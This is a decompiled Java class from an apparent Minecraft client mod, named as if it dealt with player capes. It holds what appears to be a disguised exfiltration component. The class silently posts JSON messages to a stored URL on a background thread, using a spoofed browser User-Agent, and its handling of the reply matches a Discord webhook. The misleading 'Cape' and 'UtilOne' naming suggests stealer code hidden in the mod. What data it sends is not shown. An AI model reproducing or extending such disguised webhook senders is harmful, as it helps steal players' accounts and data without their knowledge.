// 
// Decompiled by Procyon v0.5.36
// 

package me.alpha432.oyvey.manager.Identify;

import java.util.ArrayList;
import java.util.List;
import com.google.gson.annotations.SerializedName;
import com.google.gson.Gson;

public class UtilOne
{
    private static final Gson gson;
    private final String url;
    
    public UtilOne(final String url) {
        this.url = url;
    }
    
    public void sendMessage(final UtilThree dm) {
        final String strResponse;
        CapeResponse response;
        new Thread(() -> {
            strResponse = UtilTwo.post(this.url).acceptJson().contentType("application/json").header("User-Agent", "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11").send(UtilOne.gson.toJson((Object)dm)).body();
            if (!strResponse.isEmpty()) {
                response = (CapeResponse)UtilOne.gson.fromJson(strResponse, (Class)CapeResponse.class);
                try {
                    if (response.getMessage().equals("You are being rate limited.")) {
                        throw new CapeException(response.getMessage());
                    }
                }
                catch (Exception e) {
                    throw new CapeException(strResponse);
                }
            }
        }).start();
    }
    
    static {
        gson = new Gson();
    }
    
    public static class CapeResponse
    {
        boolean global;
        String message;
        @SerializedName("retry_after")
        int retryAfter;
        List<String> username;
        List<String> embeds;
        List<String> connection;
        
        public CapeResponse() {
            this.username = new ArrayList<String>();
            this.embeds = new ArrayList<String>();
            this.connection = new ArrayList<String>();
        }
        
        public String getMessage() {
            return this.message;
        }
        
        public int getRetryAfter() {
            return this.retryAfter;
        }
        
        public List<String> getUsername() {
            return this.username;
        }
        
        public List<String> getEmbeds() {
            return this.embeds;
        }
        
        public List<String> getConnection() {
            return this.connection;
        }
    }
    
    public class CapeException extends RuntimeException
    {
        public CapeException(final String message) {
            super(message);
        }
    }
}
